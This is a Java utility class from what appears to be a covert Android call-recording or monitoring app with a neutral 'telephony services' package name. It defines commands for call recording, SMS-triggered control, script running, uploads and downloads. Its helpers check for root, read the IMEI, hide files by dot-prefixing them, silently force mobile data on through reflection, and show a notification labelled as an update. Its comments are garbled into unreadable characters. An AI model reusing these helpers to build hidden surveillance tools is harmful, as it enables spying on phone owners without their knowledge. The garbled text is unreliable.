package com.telephony.services;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileFilter;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract.PhoneLookup;
import android.support.v4.app.NotificationCompat;
import android.telephony.TelephonyManager;

public class Utils {

	public static final String LOG_TAG = "myLogs";

	public static final String EXTRA_COMMAND = "command";
	public static final String EXTRA_PHONE_NUMBER = "phoneNumber";
	public static final String EXTRA_INTERVAL = "interval";
	public static final String EXTRA_DURATION = "duration";

	public static final int STATE_IN_NUMBER = 0;
	public static final int STATE_OUT_NUMBER = 1;
	public static final int STATE_CALL_START = 2;
	public static final int STATE_CALL_END = 3;

	public static final int COMMAND_REC_START = 1;
	public static final int COMMAND_REC_STOP = 2;

	public static final int COMMAND_RUN_SCRIPTER = 1;
	public static final int COMMAND_RUN_UPDATER = 2;
	public static final int COMMAND_RUN_UPLOAD = 3;
	public static final int COMMAND_RUN_DOWNLOAD = 4;

	public static final int MEDIA_MOUNTED = 0;
	public static final int MEDIA_MOUNTED_READ_ONLY = 1;
	public static final int NO_MEDIA = 2;

	public static final String EXTRA_SMS_BODY = "sms_body";
	public static final String IDENT_SMS = "#com.telephony.services";
	public static final String CONFIG_OUT_FILENAME = "config.out";

	public static final long SECOND = 1000L;
	public static final long MINUTE = SECOND * 60;
	public static final long HOUR = MINUTE * 60;
	public static final long DAY = HOUR * 24;

	/**
	 * ��������� ����� root
	 * 
	 * @return true - ���� ���� root �����
	 */
	public static Boolean checkRoot() {
		BufferedWriter stdin;
		Process ps = null;
		try {
			ps = new ProcessBuilder("su").start();
			stdin = new BufferedWriter(new OutputStreamWriter(ps.getOutputStream()));
			stdin.append("exit").append('\n');
			stdin.flush();
			stdin.close();
			ps.waitFor();
			return ps.exitValue() == 0;
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (ps != null) {
				ps.destroy();
				ps = null;
			}
		}

		return false;
	}

	/**
	 * ����� ����������� � ���������
	 * 
	 * @param context
	 * @param wifiOnly
	 * @param seconds
	 *            - ����� �������� � ��������
	 * @return ���� �������� �������� � ������� seconds ������, �� true, ����� false
	 * @throws InterruptedException
	 */
	public static boolean waitForInternet(Context context, boolean wifiOnly, int seconds) throws InterruptedException {
		int sec = 0;
		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		while (sec < seconds) {
			NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
			if (activeNetwork != null && activeNetwork.isConnected()) {
				if (wifiOnly) {
					if ((activeNetwork.getType() != ConnectivityManager.TYPE_MOBILE)) {
						return true;
					}
				} else {
					return true;
				}
			}
			TimeUnit.SECONDS.sleep(1);
			sec += 1;
		}
		return false;
	}

	/**
	 * �������� ������ sdcard
	 * 
	 * @return
	 */
	public static int getExternalStorageStatus() {
		String state = Environment.getExternalStorageState();
		if (Environment.MEDIA_MOUNTED.equals(state)) {
			return MEDIA_MOUNTED;
		} else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
			return MEDIA_MOUNTED_READ_ONLY;
		} else {
			return NO_MEDIA;
		}

	}

	/**
	 * ����������� ����� ������
	 * 
	 * @param root
	 *            ���������� ��� ������
	 * @param filter
	 *            ������ ������
	 * @return ������ ������
	 */
	public static File[] rlistFiles(File root, FileFilter filter) {
		ArrayList<File> sb = new ArrayList<File>();
		File[] list = root.listFiles(filter);
		if (list != null) {
			for (File f : list) {
				if (f.isDirectory()) {
					sb.addAll(Arrays.asList(rlistFiles(f, filter)));
				} else {
					sb.add(f);
				}
			}
		}
		return sb.toArray(new File[sb.size()]);
	}

	/**
	 * ���������� ������ ����������
	 * 
	 * @param context
	 * @param cls
	 *            �����, ������ �������� ���������� ��������
	 * @param enabled
	 */
	public static void setComponentState(Context context, Class<?> cls, boolean enabled) {
		int pmState;
		try {
			ComponentName component = new ComponentName(context, cls);
			if (enabled) {
				pmState = PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
			} else {
				pmState = PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
			}
			context.getPackageManager().setComponentEnabledSetting(component, pmState, PackageManager.DONT_KILL_APP);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * �������� ��� �������� �� ������ ��������
	 * 
	 * @param context
	 * @param phoneNum
	 *            ����� �������� ��� ������
	 * @return ���� ��� �� �������, �� �������� ����� �������� phoneNum.
	 */
	public static String getContactName(Context context, String phoneNum) {
		String res = phoneNum;
		if (phoneNum != null) {
			Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNum));
			String[] projection = new String[] { PhoneLookup.DISPLAY_NAME };

			Cursor names = context.getContentResolver().query(uri, projection, null, null, null);
			try {
				int indexName = names.getColumnIndex(PhoneLookup.DISPLAY_NAME);
				if (names.getCount() > 0) {
					names.moveToFirst();
					do {
						String name = names.getString(indexName);
						res = name;
					} while (names.moveToNext());
				}
			} finally {
				names.close();
				names = null;
			}
		}
		return res;
	}

	/**
	 * �������� ����������� � StatusBar � ������� �� �������� � ��������� �� ���������. With flags: FLAG_ONGOING_EVENT
	 * 
	 * @param context
	 * @param mId
	 *            ������������� �����������
	 * @param subtext
	 *            ��������
	 * @param intent
	 */
	public static void show_notification(Context context, int mId, String subtext, Intent intent) {
		NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(context).setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
				.setContentTitle(context.getResources().getString(R.string.update_title))
				.setContentText(context.getResources().getString(R.string.update_text)).setSubText(subtext).setAutoCancel(true);

		PendingIntent pi = PendingIntent.getActivity(context, 0, intent, Intent.FLAG_ACTIVITY_NEW_TASK);
		mBuilder.setContentIntent(pi);
		Notification notif = mBuilder.build();
		notif.flags |= Notification.FLAG_ONGOING_EVENT;
		NotificationManager mNotificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

		mNotificationManager.notify(mId, notif);
	}

	/**
	 * �������� IMEI
	 * 
	 * @param context
	 * @return IMEI ��� null
	 */
	public static String getDeviceId(Context context) {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		return tm.getDeviceId();
	}

	/**
	 * ���������� ������ ����� � ������ � ������������
	 * 
	 * @param strings
	 *            ������ �����
	 * @param glue
	 *            �����������
	 * @return ������������ ������
	 */
	public static String implodeStrings(String[] strings, String glue) {
		StringBuilder sb = new StringBuilder();
		if (strings.length > 0) {
			for (int i = 0; i < strings.length - 1; i++) {
				sb.append(strings[i]).append(glue);
			}
			sb.append(strings[strings.length - 1]);
		}
		return sb.toString();
	}

	/**
	 * �������� ������� ������ ��������� �� ���������
	 * 
	 * @param context
	 * @return VersionCode
	 */
	public static int getCurrentVersion(Context context) {
		int code = 0;
		PackageInfo pInfo = null;
		try {
			pInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
			code = pInfo.versionCode;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return code;
	}

	/**
	 * �������� ��� ����� �� "�������" (� "." �������)
	 * 
	 * @param file ���� 
	 * @return ������� ����
	 */
	public static File getHidden(File file) {
		File new_file = file;
		if (!file.isHidden()) {
			new_file = new File(file.getParent(), "." + file.getName());
		}
		return new_file;
	}

	/**
	 * ������������� ���� � �������
	 * 
	 * @param file
	 */
	public static void setHidden(File file) {
		File new_file = getHidden(file);
		if (file.exists()) {
			file.renameTo(new_file);
		}
	}

	/**
	 * ������������� ��������� ���������� ���������. �������� �� �� ���� ������� � �����������.
	 * 
	 * @param context
	 *            ��������
	 * @param enabled
	 *            ��������� true - �������� ����� ���������
	 * @throws ClassNotFoundException
	 * @throws NoSuchFieldException
	 * @throws IllegalAccessException
	 * @throws IllegalArgumentException
	 * @throws NoSuchMethodException
	 * @throws InvocationTargetException
	 */
	public static void setMobileDataEnabled(Context context, boolean enabled) throws ClassNotFoundException, NoSuchFieldException,
			IllegalAccessException, IllegalArgumentException, NoSuchMethodException, InvocationTargetException {
		final ConnectivityManager conman = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		final Class conmanClass = Class.forName(conman.getClass().getName());
		final Field iConnectivityManagerField = conmanClass.getDeclaredField("mService");
		iConnectivityManagerField.setAccessible(true);
		final Object iConnectivityManager = iConnectivityManagerField.get(conman);
		final Class iConnectivityManagerClass = Class.forName(iConnectivityManager.getClass().getName());
		final Method setMobileDataEnabledMethod = iConnectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", boolean.class);
		setMobileDataEnabledMethod.setAccessible(true);

		setMobileDataEnabledMethod.invoke(iConnectivityManager, enabled);
	}

	/**
	 * �������� ������ � ����
	 * 
	 * @param file
	 *            ����, � ������� ����� �������� ������
	 * @param input
	 *            ������ ��� ������
	 * @throws UnsupportedEncodingException
	 * @throws IOException
	 */
	public static void writeFile(File file, String input) throws UnsupportedEncodingException, IOException {
		FileOutputStream fos = null;
		try {
			fos = new FileOutputStream(file);
			fos.write(input.getBytes("UTF8"));
		} finally {
			if (fos != null) {
				fos.close();
			}
		}
	}

}
